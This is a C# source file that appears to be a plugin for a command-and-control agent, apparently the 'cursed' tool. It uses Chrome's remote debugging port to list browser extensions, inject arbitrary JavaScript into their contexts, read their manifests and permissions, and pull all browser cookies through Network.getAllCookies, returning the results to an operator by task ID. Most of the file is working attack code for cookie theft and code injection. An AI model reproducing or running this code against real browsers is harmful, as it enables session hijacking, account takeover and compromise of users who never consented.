using Agent.Interfaces;
using cursed.Models;
using System.Text.Json;

namespace Agent
{
    public partial class Plugin : IInteractivePlugin, IFilePlugin
    {
        internal List<string> GetPermissionsFromManifest(ExtensionManifest manifest)
        {
            List<string> permissions = new List<string>();
            foreach (var permission in manifest.result.value.permissions)
            {
                permissions.Add(permission);
            }

            return permissions;
        }
        internal string InjectGetAllCookies(ChromeJsonObject extension, string task_id)
        {
            using (var webSocket = new System.Net.WebSockets.ClientWebSocket())
            {
                // Connect to Chrome's WebSocket debugger
                //Need to confirm if this is an okay value
                try
                {
                    Task t = webSocket.ConnectAsync(new Uri(extension.webSocketDebuggerUrl), System.Threading.CancellationToken.None);
                    t.Wait();
                }
                catch (Exception e)
                {
                    if (this.config.debug)
                    {
                        ReturnOutput(e.ToString(), task_id);
                    }
                    return "";
                }

                // Send a message to request cookies
                DebugEvaluator message = new DebugEvaluator("Network.getAllCookies");
            
                if(!WebSocketHelper.TrySendMessage(webSocket, message.toJson()).Result)
                {
                    return "";
                }

                return WebSocketHelper.ReceiveMessage(webSocket).Result;
            }
        }
        internal string InjectJs(string id, string jsCode, CursedConfig config, string task_id)
        {
            var extensions = GetExtensions(config, task_id);

            foreach (var extension in extensions)
            {
                if (extension.id == id)
                {
                    return InjectJs(jsCode, new Uri(extension.webSocketDebuggerUrl), task_id);
                }
            }
            return "Failed to identify specified extension.";
        }
        internal bool TryInjectJs(ChromeJsonObject extension, string jsCode, string task_id, out string response)
        {
            try
            {
                var uri = new Uri(extension.webSocketDebuggerUrl);
                response = InjectJs(jsCode, uri, task_id);
                return true;
            }
            catch (Exception e)
            {
                if (this.config.debug)
                {
                    ReturnOutput("Failed to parse URI: " + extension.webSocketDebuggerUrl + Environment.NewLine + e.ToString(), task_id);
                }
            }
            response = "";
            return false;
        }
        internal string TryInjectJsAsync(ChromeJsonObject extension, string jsCode, string task_id)
        {
            try
            {
                var uri = new Uri(extension.webSocketDebuggerUrl);
                return InjectJs(jsCode, uri, task_id);
            }
            catch (Exception e)
            {
                if (this.config.debug)
                {
                    ReturnOutput("Failed to parse URI: " + extension.webSocketDebuggerUrl + Environment.NewLine + e.ToString(), task_id);
                }
                return "";
            }
        }
        internal string InjectJs(string jsCode, Uri uri, string task_id)
        {
            using (var webSocket = new System.Net.WebSockets.ClientWebSocket())
            {
                try
                {
                    Task t = webSocket.ConnectAsync(uri, CancellationToken.None);
                    t.Wait();
                }
                catch (Exception e)
                {
                    if (this.config.debug)
                    {
                        ReturnOutput(e.ToString(), task_id);
                    }
                    return "";
                }

                // Build the DevTools Protocol message to execute JavaScript
                var message2 = new
                {
                    id = 1,
                    method = "Runtime.evaluate",
                    @params = new
                    {
                        expression = jsCode,
                        returnByValue = true
                    }
                };
                var message = new RuntimeEvaluator(jsCode);
                Console.WriteLine(message.toJson());
                Console.WriteLine(JsonSerializer.Serialize(message2));
                if (!WebSocketHelper.TrySendMessage(webSocket, message.toJson()).Result)
                {
                    if (this.config.debug)
                    {
                        ReturnOutput("Failed to send message.", task_id);
                    }
                    return "";
                }
                if (this.config.debug)
                {
                    ReturnOutput("Waiting for response.", task_id);
                }
                return WebSocketHelper.ReceiveMessage(webSocket).Result;
            }
        }
        internal List<ChromeJsonObject> GetExtensions(CursedConfig config, string task_id)
        {
            List<ChromeJsonObject> extensions = new List<ChromeJsonObject>();
            using (HttpClient client = new HttpClient())
            {
                try
                {
                    // Fetch list of targets from DevTools Protocol
                    string targetsUrl = $"http://localhost:{config.debug_port}/json/list";
                    string targetsJson = client.GetStringAsync(targetsUrl).Result;
                    if (this.config.debug)
                    {
                        ReturnOutput(targetsJson, task_id);
                    }

                    List<ChromeJsonObject> targets = JsonSerializer.Deserialize<List<ChromeJsonObject>>(targetsJson);

                    foreach (var target in targets)
                    {
                        if (target.url.StartsWith("chrome-extension"))
                        {
                            extensions.Add(target);
                        }
                    }
                }
                catch (Exception e)
                {
                    if (this.config.debug)
                    {
                        ReturnOutput(e.ToString(), task_id);
                    }
                }
            }
            return extensions;
        }
        internal ExtensionManifest GetManifestFromExtension(ChromeJsonObject extension, string task_id)
        {
            if (this.config.debug)
            {
                ReturnOutput(extension.id + Environment.NewLine, task_id);
            }

            if (!TryInjectJs(extension, "chrome.runtime.getManifest()", task_id, out var response)) 
            {
                if (this.config.debug)
                {
                    ReturnOutput("Error getting manifest for " + extension.id + " " + response, task_id);
                }
                return null; 
            }
            if (this.config.debug)
            {
                ReturnOutput(response, task_id);
            }

            JsonDocument responseJsonDocument;

            try
            {
                responseJsonDocument = JsonDocument.Parse(response);
            }
            catch (Exception e)
            {
                ReturnOutput("Failure getting manifest." + Environment.NewLine + e.ToString(), task_id);
                return null;
            }

            JsonElement responseRoot = responseJsonDocument.RootElement;


            if (!responseRoot.TryGetProperty("result", out JsonElement resultElement))
            {
                ReturnOutput("Failure parsing manifest from result.", task_id);
                return null;
            }

            try
            {
                return JsonSerializer.Deserialize<ExtensionManifest>(resultElement.GetRawText());
            }
            catch (Exception e)
            {
                ReturnOutput("Failure deserializing manifest." + Environment.NewLine + e.ToString(), task_id);
                return null;
            }
        }
    }
}
